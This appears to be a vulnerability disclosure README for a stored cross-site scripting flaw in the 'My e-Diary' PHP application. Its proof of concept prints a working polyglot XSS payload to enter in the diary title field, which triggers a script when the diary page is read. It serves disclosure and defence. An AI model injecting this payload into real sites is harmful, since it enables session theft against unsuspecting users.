# My-E-Diary-System-XSS
+ **Exploit Title:** My_e_Diary_Cross_Site_Scripting
+ **Date:** 2024-07-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17074/my-e-diary-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17074&title=My+e-Diary+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Windows 11 Home + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number


## Description:
The My e-Diary application is vulnerable to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied data.
An attacker could exploit this issue to run arbitrary scripting code in an unsuspecting user's browser in the context of the affected site. This could allow an attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to `http://localhost/my-e-diary/write-diary.php`  in the 'Your Title' section we write the following code that triggers the XSS: jaVasCript:/*-/*/*/*\/'/*"/**/(/*/oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--! >\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e
+ Then go to `http://localhost/my-e-diary/read-diary.php` XSS will be triggered and a pop-up will appear.

+ ![Ekran görüntüsü 2024-01-12 010820](https://github.com/BurakSevben/My-E-Diary-System-XSS/assets/117217689/6d9cc285-eea7-4053-b466-11bc97db715d)

![Ekran görüntüsü 2024-01-12 010902](https://github.com/BurakSevben/My-E-Diary-System-XSS/assets/117217689/aeb81af7-2f2a-4b2d-98e6-8a86d1c79390)

